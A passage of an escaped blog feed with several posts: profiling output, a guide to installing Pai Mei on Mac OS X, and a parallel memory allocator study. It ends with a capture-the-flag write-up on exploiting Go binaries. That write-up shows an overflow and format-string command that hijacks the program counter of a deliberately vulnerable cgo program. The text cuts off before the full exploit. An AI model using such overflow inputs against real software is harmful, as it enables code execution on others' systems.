&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    2977.781539 task-clock                #    1.472 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            177 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             12 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          3,506 page-faults               #    0.001 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  8,523,367,658 cycles                    #    2.862 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  2,057,253,537 stalled-cycles-frontend   #   24.14% frontend cycles idle    [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    919,272,160 stalled-cycles-backend    #   10.79% backend  cycles idle    [66.70%]&lt;/span&gt;
&lt;span class="go"&gt; 12,067,358,492 instructions              #    1.42  insns per cycle        &lt;/span&gt;
&lt;span class="go"&gt;                                          #    0.17  stalled cycles per insn [83.42%]&lt;/span&gt;
&lt;span class="go"&gt;  2,454,951,795 branches                  #  824.423 M/sec                   [83.42%]&lt;/span&gt;
&lt;span class="go"&gt;     67,544,262 branch-misses             #    2.75% of all branches         [83.42%]&lt;/span&gt;

&lt;span class="go"&gt;    2.022988074 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ah, perfect! 30% faster than our original solution and significantly fewer stalled instructions.&lt;/p&gt;</summary><category term="profiling"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/posts/2012/10/28/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:posts/2012/10/28/pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
&lt;h3&gt;Getting the libraries&lt;/h3&gt;

&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
&lt;p&gt;Pai Mei depends on a number of packages:
&lt;ul&gt;
    &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;

&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg -&amp;gt; ../pydbg64/pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;│   ├── libmacdll.dylib&lt;/span&gt;
&lt;span class="go"&gt;│   └── ...&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Running Pai Mei&lt;/h3&gt;

&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gu"&gt;@@ -82,7 +82,7 @@ class PAIMEIapp (wx.App):&lt;/span&gt;
     &amp;#39;&amp;#39;&amp;#39;

     def OnInit (self):
&lt;span class="gd"&gt;-        wx.InitAllImageHandlers()&lt;/span&gt;
&lt;span class="gi"&gt;+#        wx.InitAllImageHandlers()&lt;/span&gt;

         splash = PAIMEIsplash()
         splash.Show()
&lt;span class="gh"&gt;diff --git a/console/support/mysql_connect_dialog.py b/console/support/mysql_connect&lt;/span&gt;
&lt;span class="gh"&gt;index 2201521..b641e37 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -104,7 +104,7 @@ class mysql_connect_dialog(wx.Dialog):&lt;/span&gt;
         self.parent.mysql_password = password

         self.mysql_connect(host, username, password)
&lt;span class="gd"&gt;-        self.Destroy()&lt;/span&gt;
&lt;span class="gi"&gt;+#       self.Destroy()&lt;/span&gt;

     def mysql_connect (self, host, username, password):
         try:
&lt;span class="gh"&gt;diff --git a/utils/process_stalker.py b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gh"&gt;index 987eec9..32206e4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -281,11 +283,15 @@ class process_stalker:&lt;/span&gt;
                                 continue

                         basic_blocks.append(bb.ea_start)

                 if last_dll: self.log(&amp;quot;Setting %d breakpoints on basic blocks in %s
                 else:        self.log(&amp;quot;Setting %d breakpoints on basic blocks in ma

&lt;span class="gd"&gt;-                self.pydbg.bp_set(basic_blocks, restore=self.restore)&lt;/span&gt;
&lt;span class="gi"&gt;+                for block in basic_blocks:&lt;/span&gt;
&lt;span class="gi"&gt;+                       self.pydbg.bp_set(block, restore=self.restore)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -166,7 +166,7 @@ class ProcessListCtrl (wx.ListCtrl, ListCtrlAutoWidthMixin, ColumnSorterMixin):&lt;/span&gt;
             heavy               = self.top.heavy.GetValue(),                \
             ignore_first_chance = self.top.ignore_first_chance.GetValue(),  \
             log                 = self.top.msg,                             \
&lt;span class="gd"&gt;-            main                = main,                                     \&lt;/span&gt;
&lt;span class="gi"&gt;+            main                = self.top.pida_modules.keys()[0],          \&lt;/span&gt;
             mysql               = self.top.main_frame.mysql,                \
             pida_modules        = self.top.pida_modules,                    \
             pydbg               = dbg,                                      \
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Analysis of a Parallel Memory Allocator</title><link href="http://codearcana.com/posts/2012/05/11/analysis-of-a-parallel-memory-allocator.html" rel="alternate"></link><updated>2012-05-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-11:posts/2012/05/11/analysis-of-a-parallel-memory-allocator.html</id><summary type="html">&lt;h1&gt;Background&lt;/h1&gt;
&lt;h2&gt;Problem&lt;/h2&gt;
&lt;p&gt;Many modern programs frequently use dynamic memory allocation. However, modern
programs increasingly are multithreaded and parallel to take advantage of
increasingly parallel processors. Unfortunately, this trend conflicts with the
fact that there is a single heap in most current programs. Consequently,
research into parallel memory allocators is topical and important.&lt;/p&gt;
&lt;h2&gt;Solution?&lt;/h2&gt;
&lt;p&gt;The simplest solution to ensuring correctness in a multithread memory allocator
is to use a global lock around the heap. Unfortunately, this has
&lt;em&gt;extremely&lt;/em&gt; negative performance consequences and is almost never 
adopted by modern memory allocators. Modern memory allocators tend to adopt 
some form of the following 3 solutions:
&lt;ul&gt;
&lt;li&gt;
They partition the heap into logical arenas or chunks that handle large 
portions of the heap. This reduces contention on the global heap and 
heap data structures.
&lt;/li&gt;
&lt;li&gt;
They use fine grained locking on individual slabs or slab classes.
&lt;/li&gt;
&lt;li&gt;
They use thread local caches to provide a fast path that requires no locks.
&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h2&gt;Modern memory allocators&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;As I understand, the most popular modern parallel mallocs are 
&lt;a href="https://www.facebook.com/notes/facebook-engineering/scalable-memory-allocation-using-jemalloc/480222803919"&gt;&lt;tt&gt;jemalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://goog-perftools.sourceforge.net/doc/tcmalloc.html"&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.malloc.de/en/"&gt;&lt;tt&gt;ptmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="https://doors.gracenote.com/developer/open.html"&gt;&lt;tt&gt;concur&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.nedprod.com/programs/portable/nedmalloc/"&gt;&lt;tt&gt;nedmalloc&lt;/tt&gt;&lt;/a&gt;
and &lt;a href="http://www.cs.umass.edu/~emery/pubs/berger-asplos2000.pdf"&gt;&lt;tt&gt;hoard&lt;/tt&gt;&lt;/a&gt;. 
Oracle did some 
&lt;a href="http://developers.sun.com/solaris/articles/multiproc/multiproc.html"&gt;investigation&lt;/a&gt; 
and I have taken a look at the internals of jemalloc, tcmalloc, concur, and hoard. 
As I understand:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt; uses a global slab allocator with thread local caches to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;hoard&lt;/tt&gt; uses different arenas and assigns superblocks to threads to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;jemalloc&lt;/tt&gt; uses different arenas and thread local caches to avoid contention
and uses red black trees and an optimized slab allocator to avoid fragmentation&lt;/li&gt;
&lt;li&gt;&lt;tt&gt;concur&lt;/tt&gt; uses different arenas and fine grained locking on size classes to avoid contention&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
One interesting characteristic of many of these memory allocators is that they
all tend to allocate memory from the system in chunks of about 1 to 4MB.
Consequently, they tend to have an overhead of up to 2 to 4MB per arena. Most
of them justify this overhead by pointing out that 2MB of overhead is minimal
when the total application footprint can exceed 1GB (in an application such as
firefox) and it is acceptable for an application to use 2MB of heap when
modern computers routinely have several GB of RAM.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
Another interesting characteristic of these memory allocators is they almost
never coallesce individual blocks (some do coallesce individual blocks). 
Instead, they use slab allocators and assume
allocation requests tend be of very similar sizes. In general, this follows
the general pattern of tolerating a moderate amount of memory overhead to
increase performance.
&lt;/p&gt;

&lt;h1&gt;Approach&lt;/h1&gt;
&lt;h2&gt;A simple modern memory allocator&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to investigate and analyze the performance of a modern memory
allocator, I wrote a simplified memory allocator, &lt;tt&gt;ar_malloc&lt;/tt&gt;, that 
uses many of the modern optimizations. &lt;tt&gt;ar_malloc&lt;/tt&gt; is based quite
heavily on &lt;tt&gt;jemalloc&lt;/tt&gt; but makes some simplifications. In order to keep 
the work manageable, &lt;tt&gt;ar_malloc&lt;/tt&gt; makes the assumption that allocation 
requests are smaller than 1024 bytes. In addition, it uses slabs of a fixed 
size and never frees memory to the system (&lt;tt&gt;jemalloc&lt;/tt&gt; uses variable sized
slabs to reduce memory overhead).
&lt;/p&gt;&lt;/p&gt;
&lt;h2&gt;Testing a memory allocator ##&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to test &lt;tt&gt;ar_malloc&lt;/tt&gt;, I constructed a test framework (based off a
test in the &lt;tt&gt;tcmalloc&lt;/tt&gt; codebase) that spawns 
several threads that each randomly decide to allocate a random sized block or 
free a random block. This does not simulate the effect of actually using the blocks
and does not simulate a realistic workload, but it is still a useful
basis for investigation. I ran this test on a 16 core shared memory system and used
new initialization of malloc for each run to reduce the variance in run time.
&lt;/p&gt;&lt;/p&gt;
&lt;h1&gt;Results&lt;/h1&gt;
&lt;h2&gt;Comparision of &lt;tt&gt;ar_malloc&lt;/tt&gt; to other solutions&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
We compared the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;, &lt;tt&gt;ar_malloc&lt;/tt&gt; with a global lock, 
and the libc malloc on the test described in the previous section.
&lt;/p&gt;
&lt;figure&gt;
&lt;img alt="Run time vs Number of threads" src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;amp;oid=4&amp;amp;zx=1aneio5en2km" /&gt;
&lt;figcaption&gt;This is chart of test run time vs number of threads for a global locked malloc, &lt;tt&gt;ar_malloc&lt;/tt&gt;, and libc malloc. As 
    you can see, the global lock solution is really bad.&lt;/figcaption&gt;
&lt;/figure&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=14&amp;zx=rgpgcr33f1ax" /&gt;
    &lt;figcaption&gt;This is chart of test run time vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; is about 3 times faster than libc for even
    single threaded execution. &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=8&amp;zx=ttz2qtfnzo60" /&gt;
    &lt;figcaption&gt;This is chart of test speedup vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; exhibits linear speedup that scales cleanly with
    the number of threads, whereas libc scales only to about 8 threads. 
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2&gt;Comparison of different configuration&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
I examined several different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;, specifically 
focusing on the number of arenas. We attempted to figure out the effect of and 
analyze the behavior of using different number of arenas.
&lt;/p&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=11&amp;zx=fwaahh94nhlg" /&gt;
&lt;figcaption&gt;This is a chart of run time vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
    As you can see, there appear to be two curves. We will call the lower one the &amp;quot;no contention&amp;quot; curve and the
    upper one the &amp;quot;contention&amp;quot; curve. You can see that the performance of a memory allocator moves from the &amp;quot;no contention&amp;quot;
    curve to the &amp;quot;contention&amp;quot; curve when the number of threads exceeds the number of arenas.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=13&amp;zx=fhdbihufrx4u" /&gt;
    &lt;figcaption&gt;
    This is a chart of speedup vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;. As you before, there are 
    two curves: the &amp;quot;no contention&amp;quot; line and the &amp;quot;contention&amp;quot; line. Again, the speedup of a memory allocator
    moves from the &amp;quot;no contention&amp;quot; line to the &amp;quot;contention&amp;quot; line when the number of threads exceeds the 
    number of arenas. It is important to note that the speedup is still mostly linear even when the number of arenas is far less
    than number of threads.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Over the course of this project, I have demonstrated that it is feasible to 
write a modern parallel memory allocator that performs quite favorably 
on random workloads. &lt;tt&gt;ar_malloc&lt;/tt&gt; makes many simplifying assumptions,
but is just over 2000 lines of code, outperforms libc malloc by a factor
of 3, and demonstrates linear speedup that seems to scale very well with
the number of threads.&lt;/p&gt;
&lt;h1&gt;Further Investigation&lt;/h1&gt;
&lt;p&gt;&lt;p&gt;
There are several routes for further investigation in parallel memory
allocators.&lt;/p&gt;
&lt;p&gt;The exisiting test framework allocates random sizes distributed
uniformly in the range 8, 1024. This almost certainly does not simulate 
realistic memory allocation patterns. An interesting further exploration could
use &lt;tt&gt;ar_malloc&lt;/tt&gt; with real programs (either via static linking or LD_PRELOAD) 
or to investigate the actual memory distribution of a general program. 
&lt;/p&gt;
&lt;p&gt;This investigation only examined the effect of different number of arenas.
A further exploration could examine the effect of thread local caches and fine
grained locking on the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
&lt;/p&gt;&lt;/p&gt;</summary><category term="malloc"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:posts/2012/05/06/securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
&lt;/p&gt;

&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;

&lt;p&gt;
Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
&lt;/ul&gt;
I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
&lt;/p&gt;

&lt;p&gt;
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
&lt;/p&gt;

&lt;p&gt;
Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
&lt;/p&gt;

&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;

&lt;h4&gt;Disclaimer&lt;/h4&gt;

&lt;p&gt;
First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
&lt;/p&gt;

&lt;p&gt;
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
&lt;/p&gt;

&lt;p&gt;
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
&lt;/p&gt;

&lt;h4&gt;The actual exploit&lt;/h4&gt;

&lt;p&gt;
The Go runtime has some really interesting properties that make it fun to exploit:
&lt;ul&gt;
    &lt;li&gt;The heap is executable.&lt;/li&gt;
    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
&lt;/ul&gt;
We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
&lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;throw: fault&lt;/span&gt;
&lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;

&lt;span class="go"&gt;goroutine 1 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32&lt;/span&gt;
&lt;span class="go"&gt;levellog.Log(0x1, 0x1883cd00, 0x7f)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140&lt;/span&gt;
&lt;span class="go"&gt;main.main()&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/build/src/webapp/main.go:21 +0x101&lt;/span&gt;

&lt;span class="go"&gt;goroutine 2 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;created by runtime.main&lt;/span&gt;
